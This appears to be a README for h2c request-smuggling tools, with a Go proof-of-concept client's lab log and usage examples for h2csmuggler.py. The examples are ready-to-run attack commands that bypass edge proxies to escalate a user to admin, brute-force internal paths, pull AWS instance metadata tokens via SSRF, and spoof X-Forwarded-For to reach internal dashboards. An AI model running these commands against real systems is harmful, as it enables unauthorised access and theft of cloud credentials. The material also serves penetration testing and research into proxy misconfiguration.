# Golang Client

`docker-compose up` to launch Traefik, nginx, haproxy, nuster and an upgradable to h2c backend

`go run ./` to launch the client test


```
2020/09/12 16:49:11 Try Traefik HTTP
2020/09/12 16:49:11 Try to upgrade
2020/09/12 16:49:11 Switched success
2020/09/12 16:49:11 Try normal request
2020/09/12 16:49:11 Try to send another request in the upgraded connection
2020/09/12 16:49:11 same status code 401 and 401
2020/09/12 16:49:11 Seems OK (secure)
2020/09/12 16:49:11 ---------------
2020/09/12 16:49:11 Try nginx HTTP
2020/09/12 16:49:11 Try to upgrade
2020/09/12 16:49:11 Switched success
2020/09/12 16:49:11 Try normal request
2020/09/12 16:49:11 Try to send another request in the upgraded connection
2020/09/12 16:49:11 different status code 200 and 403
You got the flag!
2020/09/12 16:49:11 ---------------
2020/09/12 16:49:11 Try Traefik HTTPS
2020/09/12 16:49:11 Try to upgrade
2020/09/12 16:49:11 upgrade failed: Get "https://127.0.0.1:8443": http2: invalid Upgrade request header: ["h2c"]
2020/09/12 16:49:11 ---------------
2020/09/12 16:49:11 Try nginx HTTPS
2020/09/12 16:49:11 Try to upgrade
2020/09/12 16:49:11 Switched success
2020/09/12 16:49:11 Try normal request
2020/09/12 16:49:11 Try to send another request in the upgraded connection
2020/09/12 16:49:11 different status code 200 and 403
You got the flag!
```
# Python code
### Usage

h2cSmuggler uses a familiar curl-like syntax for describing the smuggled request:
```sh
usage: h2csmuggler.py [-h] [--scan-list SCAN_LIST] [--threads THREADS] [--upgrade-only] [-x PROXY] [-i WORDLIST] [-X REQUEST] [-d DATA] [-H HEADER] [-m MAX_TIME] [-t] [-v]
                      [url]

Detect and exploit insecure forwarding of h2c upgrades.

positional arguments:
  url

optional arguments:
  -h, --help            show this help message and exit
  --scan-list SCAN_LIST
                        list of URLs for scanning
  --threads THREADS     # of threads (for use with --scan-list)
  --upgrade-only        drop HTTP2-Settings from outgoing Connection header
  -x PROXY, --proxy PROXY
                        proxy server to try to bypass
  -i WORDLIST, --wordlist WORDLIST
                        list of paths to bruteforce
  -X REQUEST, --request REQUEST
                        smuggled verb
  -d DATA, --data DATA  smuggled data
  -H HEADER, --header HEADER
                        smuggled headers
  -m MAX_TIME, --max-time MAX_TIME
                        socket timeout in seconds (type: float; default 10)
  -t, --test            test a single proxy server
  -v, --verbose
```
### Examples
1\. Scanning a list of URLs (e.g., `https://example.com:443/api/`, `https://example.com:443/payments`, `https://sub.example.com:443/`) to identify `proxy_pass` endpoints that are susceptible to smuggling (be careful with thread counts when testing a single server):

```
./h2csmuggler.py --scan-list urls.txt --threads 5
```

Or, to redirect output to a file. Use stderr (`2>`) and stdout (`1>`). The stderr stream contains errors (e.g., SSL handshake/timeout issues), while stdout contains results.

```
./h2csmuggler.py --scan-list urls.txt --threads 5 2>errors.txt 1>results.txt
```

2\. Sending a smuggled POST request past `https://edgeserver` to an internal endpoint:
```
./h2csmuggler.py -x https://edgeserver -X POST -d '{"user":128457 "role": "admin"}' -H "Content-Type: application/json" -H "X-SYSTEM-USER: true" http://backend/api/internal/user/permissions
```

3\. Brute-forcing internal endpoints (using HTTP/2 multiplexing), where `dirs.txt` represents a list of paths (e.g., `/api/`, `/admin/`).
```
/h2csmuggler.py -x https://edgeserver -i dirs.txt http://localhost/
```

4\. Exploiting `Host` header SSRF over h2c smuggling (e.g., AWS metadata IMDSv2):

Retrieving the token:
```
./h2csmuggler.py -x https://edgeserver -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" http://169.254.169.254/latest/api/token`
```

Transmitting the token:
```
./h2csmuggler.py -x https://edgeserver -H "x-aws-ec2-metadata-token: TOKEN" http://169.254.169.254/latest/meta-data/
```
5\. Spoofing an IP address with the `X-Forwarded-For` header to access an internal dashboard:
```
./h2csmuggler.py -x https://edgeserver -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 172.16.0.1" http://backend/system/dashboard
```
# References
```
https://github.com/BishopFox/h2csmuggler
https://github.com/juliens/h2csmuggling-poc
```
